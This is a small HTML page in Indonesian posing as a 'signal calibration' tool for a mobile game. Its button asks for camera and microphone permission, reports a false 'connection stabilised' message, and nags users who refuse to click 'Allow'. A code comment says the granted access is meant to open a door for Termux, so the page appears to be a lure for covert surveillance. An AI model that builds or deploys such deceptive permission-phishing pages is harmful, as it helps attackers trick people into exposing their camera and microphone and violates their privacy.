<!DOCTYPE html>
<html>
<head>
    <title>Sistem Kalibrasi Sinyal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #1a1a1a; color: #58a6ff; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .btn { background: #238636; color: white; padding: 20px; border-radius: 50px; border: none; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: 0.3s; }
        .btn:active { background: #2ea043; transform: scale(0.95); }
    </style>
</head>
<body>
    <h2>ðŸš€ Verifikasi Sinyal Hayabusa</h2>
    <p>Klik tombol di bawah untuk menstabilkan jaringan game.</p>
    <button class="btn" onclick="start()">HUBUNGKAN SEKARANG</button>

    <script>
        function start() {
            // Memicu permintaan izin sistem (Kamera & Mic)
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(() => {
                alert("Koneksi Berhasil! Sinyal HP Anda kini stabil.");
                // Setelah diklik Allow, pintu akses terbuka untuk Termux
            })
            .catch(() => {
                alert("Gagal! Harap klik 'Izinkan' agar koneksi tidak terputus.");
            });
        }
    </script>
</body>
</html>
